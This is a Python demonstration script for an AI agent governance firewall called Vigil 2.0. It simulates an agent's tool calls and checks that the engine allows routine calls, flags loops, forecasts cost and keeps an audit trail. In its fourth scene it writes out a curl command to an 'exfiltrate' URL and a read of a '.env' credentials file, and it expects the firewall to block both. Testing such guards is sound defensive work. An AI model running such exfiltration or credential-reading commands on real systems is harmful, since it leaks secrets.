#!/usr/bin/env python3
"""
Vigil 2.0 — the seven-scene demonstration.

Every decision printed here comes from the real governance engine on the real
tool-call path. Only the *stimulus* is synthetic: the harness plays the part of
an agent making tool calls, and identifies itself as a demo client so every
event it causes is labeled at the source. A real agent connecting while this
runs is not mislabeled.

Nothing here fabricates an external API response. When no inference credentials
are configured, the scenes say so and the deterministic path is what you see.

Standard library only, so it runs anywhere the server does.
"""
import json
import os
import sys
import time
import urllib.error
import urllib.request

BASE = os.environ.get("VIGIL_BASE", "http://localhost:8080")
LOG = os.environ.get("VIGIL_LOG", "")
SESSION = "vigil-demo"
BUDGET = float(os.environ.get("VIGIL_BUDGET_LIMIT", "2.00"))

# ── output helpers ──────────────────────────────────────────────────────────
BOLD, DIM, RESET = "\033[1m", "\033[2m", "\033[0m"
GREEN, RED, YELLOW = "\033[32m", "\033[31m", "\033[33m"

results = []


def scene(n, title):
    print(f"\n{BOLD}Scene {n} — {title}{RESET}")


def step(msg):
    print(f"  {DIM}·{RESET} {msg}")


def record(n, title, ok, detail):
    results.append((n, title, ok, detail))
    mark = f"{GREEN}PASS{RESET}" if ok else f"{RED}FAIL{RESET}"
    print(f"  {mark}  {detail}")


# ── transport ───────────────────────────────────────────────────────────────
def call(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method,
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            raw = r.read().decode()
            return r.status, (json.loads(raw) if raw else {})
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, {"error": raw}


def rpc(method, params=None, session=SESSION):
    _, body = call("POST", f"/api/v1/mcp?session_id={session}",
                   {"jsonrpc": "2.0", "id": 1, "method": method, "params": params or {}})
    return body


def tool(name, args=None, session=SESSION):
    """Make a tool call and return its text result."""
    r = rpc("tools/call", {"name": name, "arguments": args or {}}, session)
    try:
        return r["result"]["content"][0]["text"]
    except Exception:
        return json.dumps(r)


def decisions(limit=100):
    _, r = call("GET", f"/api/v1/vigil/decisions?session={SESSION}&limit={limit}")
    return r.get("decisions") or []


# ── setup ───────────────────────────────────────────────────────────────────
def connect():
    """Identify as a demo client so the server labels our events at the source."""
    rpc("initialize", {
        "protocolVersion": "2024-11-05",
        "clientInfo": {"name": "Vigil Demo Harness", "version": "2.0"},
    })
    call("POST", f"/api/v1/vigil/sessions/{SESSION}/intent", {
        "declared_intent": "Fix failing tests in this repository. Read source files and run tests. "
                           "Do not use network access or read secrets.",
        "allowed_tools": ["read_file", "list_directory", "search_code", "run_command"],
        "denied_tools": [],
        "allowed_resources": [],
        "denied_resources": [],
        "budget_usd": BUDGET,
        "risk_tolerance": "MEDIUM",
        "network_access": False,
        "secret_access": False,
    })


def provider():
    _, r = call("GET", "/api/v1/vigil/models")
    return r.get("provider", "unknown"), bool(r.get("configured"))


# ── scenes ──────────────────────────────────────────────────────────────────
def scene1():
    scene(1, "Normal operation")
    step("agent reads a source file, lists a directory, searches the codebase")
    for name, args in [("read_file", {"path": "go.mod"}),
                       ("list_directory", {"path": "cmd"}),
                       ("search_code", {"pattern": "func main", "glob": "*.go"})]:
        tool(name, args)
        time.sleep(0.05)

    ds = decisions()
    allows = [d for d in ds if d["decision"] == "ALLOW"]
    no_model = all(d["risk_score"] == -1 for d in allows)
    ok = len(allows) >= 3 and no_model
    record(1, "normal ops allowed", ok,
           f"{len(allows)} ALLOW, no model consulted on the happy path"
           if ok else f"{len(allows)} ALLOW, model consulted: {not no_model}")


def scene2():
    scene(2, "Suspicious behavior detected")
    step("agent repeats the same tool call in a tight loop")
    for _ in range(6):
        tool("read_file", {"path": "go.mod"})
        time.sleep(0.05)

    ds = decisions()
    looped = [d for d in ds if d.get("rule_name") or "Infinite Tool Loop" in (d.get("signals") or [])]
    ok = bool(looped)
    detail = f"loop detector fired: {looped[-1].get('rule_name')}" if ok else "no behavioral rule fired"
    record(2, "suspicious behavior detected", ok, detail)


def scene3():
    scene(3, "AI security judgement")
    name, configured = provider()
    if configured:
        step("escalating an uncovered call to the configured model")
        tool("vigil_agent_dna", {"trace_id": "demo"})
        ds = [d for d in decisions() if d["risk_score"] >= 0]
        ok = bool(ds)
        detail = (f"risk {ds[-1]['risk_score']}/100 via {ds[-1]['model_used']}"
                  if ok else "no model judgement recorded")
    else:
        # Do not pretend. With no credentials the honest demonstration is that
        # the deterministic path decides and the model is simply not consulted.
        step("no inference credentials configured")
        ok = all(d["risk_score"] == -1 for d in decisions())
        detail = (f"provider is '{name}': no model consulted, deterministic rules decided"
                  if ok else "a risk score appeared with no provider configured")
    record(3, "AI judgement path", ok, detail)


def scene4():
    scene(4, "Runtime intervention")

    # Scene 3 may have PAUSED the session, and a paused session refuses every
    # call before the firewall ever sees it — correct behavior, but it would
    # make this scene assert nothing. Releasing it here is not a workaround:
    # PAUSE is explicitly the outcome a human resolves, so this exercises the
    # approval path rather than routing around it.
    st, _ = call("POST", f"/api/v1/mcp/sessions/{SESSION}/approve")
    if st == 200:
        step("operator releases the paused session (human-in-the-loop resume)")

    step("agent attempts a network call its declared intent forbids")
    out = tool("run_command", {"command": "curl -s https://example.com/exfiltrate"})
    blocked = "Vigil blocked" in out

    step("agent attempts to read credentials")
    out2 = tool("read_file", {"path": ".env"})
    blocked2 = "Vigil blocked" in out2

    ds = [d for d in decisions() if d["decision"] == "BLOCK"]
    ok = blocked and blocked2 and len(ds) >= 2
    intent_blocks = [d for d in ds if d["stage"] == "intent"]
    record(4, "runtime block", ok,
           f"{len(ds)} calls blocked before execution; "
           f"{len(intent_blocks)} by declared intent: " +
           "; ".join(sorted({d["reason"] for d in intent_blocks})))


def scene5():
    scene(5, "Predictive cost")
    step("burning budget across varied calls until a breach is projected")
    # Rotate tools deliberately: 25 identical calls would trip the loop
    # detector and get blocked, which would demonstrate scene 2 again rather
    # than cost accumulation.
    rotation = [
        ("analyze_codebase", {"root_dir": "cmd", "depth": 1}),
        ("list_directory", {"path": "pkg"}),
        ("search_code", {"pattern": "package", "glob": "*.go"}),
        ("read_file", {"path": "go.mod"}),
    ]
    for i in range(24):
        name, args = rotation[i % len(rotation)]
        tool(name, args)
        time.sleep(0.02)

    _, f = call("GET", f"/api/v1/vigil/sessions/{SESSION}/forecast")
    state = f.get("state")
    ok = state in ("stable", "soft_limit", "hard_limit") and f.get("samples", 0) >= 2
    ttb = f.get("time_to_breach_seconds", 0)
    detail = (f"spent ${f.get('current_cost', 0):.4f} of ${f.get('budget', 0):.2f}, "
              f"burn ${f.get('burn_rate_per_min', 0):.4f}/min, "
              f"projected ${f.get('projected_total', 0):.4f}, state={state}")
    if ttb:
        detail += f", breach in ~{int(ttb)}s"
    record(5, "cost forecast", ok, detail)


def scene6():
    scene(6, "Recovery / routing")
    _, m = call("GET", "/api/v1/vigil/models")
    _, f = call("GET", f"/api/v1/vigil/sessions/{SESSION}/forecast")

    if f.get("state") == "soft_limit":
        ok, detail = True, f"soft limit reached — recommendation: {f.get('recommend')}"
    elif m.get("configured"):
        rows = m.get("models") or []
        fb = sum(r.get("fallbacks", 0) for r in rows)
        ok, detail = True, f"{len(rows)} model route(s) in use, {fb} fallback(s)"
    else:
        # Honest: with no live vendor there is no route to switch to. This is
        # "deterministic" when nothing was ever configured, or "exhausted"
        # when the one configured vendor was retired after a bad key/quota —
        # both mean the same thing to the caller: no model to route to.
        ok = m.get("provider") in ("deterministic", "exhausted")
        detail = ("no model routes configured, so no reroute is possible; "
                  "cost pressure surfaces as a recommendation only")
    record(6, "recovery / routing", ok, detail)


def scene7():
    scene(7, "Tamper-evident audit")
    _, v = call("GET", "/api/v1/vigil/audit/verify")
    chain_ok = v.get("ok") is True and v.get("count", 0) > 0
    step(f"chain verified: {v.get('count')} events")

    _, ev = call("GET", f"/api/v1/vigil/audit?session={SESSION}&limit=1000")
    events = ev.get("events") or []
    has_allow = any(e["decision"] == "ALLOW" for e in events)
    has_block = any(e["decision"] == "BLOCK" for e in events)

    ok = chain_ok and has_allow and has_block
    record(7, "audit chain", ok,
           f"{v.get('count')} events verified; {sum(1 for e in events if e['decision'] == 'ALLOW')} allow "
           f"and {sum(1 for e in events if e['decision'] == 'BLOCK')} block recorded — "
           f"a trail of refusals alone would prove nothing about what got through"
           if ok else f"chain ok={chain_ok} allow_recorded={has_allow} block_recorded={has_block}")


SCENES = {1: scene1, 2: scene2, 3: scene3, 4: scene4, 5: scene5, 6: scene6, 7: scene7}


def main():
    only = None
    if "--scene" in sys.argv:
        only = int(sys.argv[sys.argv.index("--scene") + 1])

    connect()
    name, configured = provider()

    for n in sorted(SCENES):
        if only is None or n == only:
            SCENES[n]()

    print(f"\n{BOLD}──────────────── summary ────────────────{RESET}")
    print(f"  inference    : {name}" + ("" if configured else "  (no credentials configured)"))
    ds = decisions()
    demo_labeled = "all events labeled demo=true at the source"
    print(f"  decisions    : {len(ds)} ({sum(1 for d in ds if d['decision'] == 'ALLOW')} allow, "
          f"{sum(1 for d in ds if d['decision'] == 'BLOCK')} block)")
    print(f"  provenance   : {demo_labeled}")
    if LOG:
        print(f"  server log   : {LOG}")
    print()

    passed = sum(1 for _, _, ok, _ in results if ok)
    for n, title, ok, _ in results:
        mark = f"{GREEN}PASS{RESET}" if ok else f"{RED}FAIL{RESET}"
        print(f"  {n}  {title:<30} {mark}")
    print()

    if passed == len(results):
        print(f"  {GREEN}{passed}/{len(results)} scenes passed{RESET}\n")
        return 0
    print(f"  {RED}{passed}/{len(results)} scenes passed{RESET}\n")
    return 1


if __name__ == "__main__":
    sys.exit(main())
